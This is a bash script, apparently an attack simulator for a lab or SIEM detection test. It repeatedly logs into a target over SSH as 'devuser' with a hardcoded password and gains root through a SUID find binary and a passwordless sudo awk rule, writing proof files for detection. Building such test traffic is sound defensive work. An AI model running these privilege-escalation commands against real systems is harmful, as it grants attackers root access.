#!/bin/bash
# Ke tan cong da chiem tai khoan thuong 'devuser'. Dinh ky SSH vao va LEO LEN ROOT
# qua 2 duong: (1) SUID /usr/bin/find, (2) sudo NOPASSWD awk. Ghi bang chung lam SIEM phat hien.
TARGET=target
DUSER=devuser
DPW=devpass123
OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
-o PreferredAuthentications=password -o PubkeyAuthentication=no"

run() { sshpass -p "$DPW" ssh $OPTS "$DUSER@$TARGET" "$1" 2>/dev/null; }

# Cho sshd target san sang
for i in $(seq 1 60); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null && break
  sleep 2
done

while true; do
  # --- Duong 1: SUID find -> chay lenh voi quyen root ---
  run "find /etc/hostname -exec /bin/bash -p -c 'id>/tmp/.rootproof1 2>/dev/null;chmod 644 /tmp/.rootproof1 2>/dev/null;echo suid_find>>/root/.pwned 2>/dev/null' \\;"
  # --- Duong 2: sudo NOPASSWD awk -> system() chay shell root ---
  run "sudo -n awk 'BEGIN{system(\"id>/tmp/.rootproof2 2>/dev/null;chmod 644 /tmp/.rootproof2 2>/dev/null;echo sudo_awk>>/root/.pwned 2>/dev/null\")}'"
  sleep 30
done
